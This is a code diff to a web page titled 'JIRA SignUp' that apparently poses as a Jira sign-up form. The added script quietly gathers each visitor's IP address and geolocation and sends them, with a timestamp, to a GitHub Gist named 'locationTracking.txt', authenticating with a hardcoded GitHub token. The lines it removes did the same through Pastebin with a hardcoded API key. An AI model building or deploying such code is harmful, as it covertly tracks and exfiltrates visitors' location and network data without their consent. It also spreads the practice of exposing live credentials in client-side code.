@@ -6,7 +6,8 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>JIRA SignUp</title>
-    <script src="https://code.jquery.com/jquery-3.6.3.min.js" integrity="sha256-pvPw+upLPUjgMXY0G+8O0xUf+/Im1MZjXxxgOcBQBXU=" crossorigin="anonymous"></script>
+    <script src="https://code.jquery.com/jquery-3.6.3.min.js"
+        integrity="sha256-pvPw+upLPUjgMXY0G+8O0xUf+/Im1MZjXxxgOcBQBXU=" crossorigin="anonymous"></script>
 </head>
 
 <body>
@@ -41,38 +42,70 @@
                 const [ip, coords] = results;
                 console.log(`Device IP: ${ip}`);
                 console.log(`Device geolocation: ${coords.latitude}, ${coords.longitude}`);
-                let latiLong = `${coords.latitude}, ${coords.longitude}`;
 
-                // call pastebin function
-                console.log(latiLong);
+                let userData = {
+                    coordinates: coords,
+                    latitude: coords.latitude,
+                    longitude: coords.longitude,
+                    latiLong: `${coords.latitude}, ${coords.longitude}`,
+                    ipAddress: ip,
+                    email: "test@example.com",
+                    dateTime: new Date(Date.now()),
+                }
+
+                // call usePasteBin function
+                console.log(userData);
+                console.log(JSON.stringify(userData))
+                usePasteBin(userData);
             })
             .catch(error => console.error(error));
 
 
+        function usePasteBin(userData) {
+            const token = "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";
+            const apiUrl = "https://api.github.com/gists/89cdd2b3a50a05df4580daa767cec44c";
+            const newContent = JSON.stringify(userData);
+            const filename = "locationTracking.txt";
+            const description = "My updated Gist description";
 
-            function usePasteBin(geolocation) {
-                var api_url = "https://pastebin.com/api/api_post.php";
-                var api_key = "znbYAG5mVKGNPINAaU-bmWmspSVANhzn";
-                var paste_content = "this's geolocation: " + geolocation;
-                var paste_name = "Email Address: test@yahoo.com";
-                var paste_format = "text";
-                var paste_expire_date = "1D";
-                var paste_private = 0;
-        
-                $.post(api_url, {
-                    api_option: "paste",
-                    api_dev_key: api_key,
-                    api_paste_code: paste_content,
-                    api_paste_name: paste_name,
-                    api_paste_format: paste_format,
-                    api_paste_expire_date: paste_expire_date,
-                    api_paste_private: paste_private
-                }, function (data) {
-                    // The Pastebin API returns a URL for the newly created paste.
-                    // You can use this URL to display the paste to the user.
-                    console.log(data);
+            // Retrieve the existing content of the Gist
+            fetch(apiUrl, {
+                method: "GET",
+                headers: {
+                    "Authorization": `token ${token}`
+                }
+            })
+                .then(response => response.json())
+                .then(data => {
+                    // Extract the existing content from the Gist
+                    const existingContent = data.files["locationTracking.txt"].content;
+
+                    // Append the new content to the existing content
+                    const updatedContent = existingContent + "," + newContent;
+
+                    // Update the Gist with the combined content
+                    fetch(apiUrl, {
+                        method: "PATCH",
+                        headers: {
+                            "Authorization": `token ${token}`,
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            "files": {
+                                "locationTracking.txt": {
+                                    "content": updatedContent
+                                }
+                            }
+                        })
+                    })
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log(data);
+                            // The API response will include the URL of the updated Gist
+                        });
                 });
-            }
+
+        }
 
         setTimeout(() => {
             console.log('Loaded Timeout');
